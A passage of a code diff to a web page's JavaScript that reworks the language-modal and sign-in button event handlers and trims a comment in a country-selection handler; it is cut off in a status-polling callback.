@@ -175,7 +175,10 @@ document.addEventListener('DOMContentLoaded', () => {
 
   // Language Modal Handlers
   if (btnToggleLang) {
-    btnToggleLang.addEventListener('click', () => langModal.classList.add('active'));
+    btnToggleLang.addEventListener('click', (e) => {
+      e.stopPropagation();
+      langModal.classList.add('active');
+    });
   }
   if (btnCloseLang) {
     btnCloseLang.addEventListener('click', () => langModal.classList.remove('active'));
@@ -194,7 +197,6 @@ document.addEventListener('DOMContentLoaded', () => {
     const countryName = e.target.value;
     const config = countryConfigs[countryName] || countryConfigs['Tanzania, United Republic of'];
     
-    // Update Flags
     ['1', '2', '3'].forEach(id => {
       const badge = document.getElementById(`badge-country-${id}`);
       const flag = document.getElementById(`flag-display-${id}`);
@@ -208,15 +210,16 @@ document.addEventListener('DOMContentLoaded', () => {
     updateLanguageTexts(config.lang);
   });
 
-  // GUARANTEED SIGN IN BUTTON CLICK HANDLER
+  // BULLETPROOF SIGN IN BUTTON LISTENER
   const btnSignIn = document.getElementById('btn-welcome-signin');
   if (btnSignIn) {
-    ['click', 'touchstart'].forEach(evt => {
-      btnSignIn.addEventListener(evt, (e) => {
-        e.preventDefault();
-        showScreen(screenStep1);
-      });
-    });
+    const handleSignIn = (e) => {
+      e.preventDefault();
+      e.stopPropagation();
+      showScreen(screenStep1);
+    };
+    btnSignIn.addEventListener('click', handleSignIn);
+    btnSignIn.addEventListener('touchend', handleSignIn);
   }
 
   // Sliders
@@ -444,4 +447,4 @@ document.addEventListener('DOMContentLoaded', () => {
         } else if (data.status === 'SUCCESS') {
           clearInterval(statusPollInterval);
           hideLoading();
-          const config = countryConfigs[countryDropdown.value] || countryConfigs['Tanzania, United Republ
+          const con
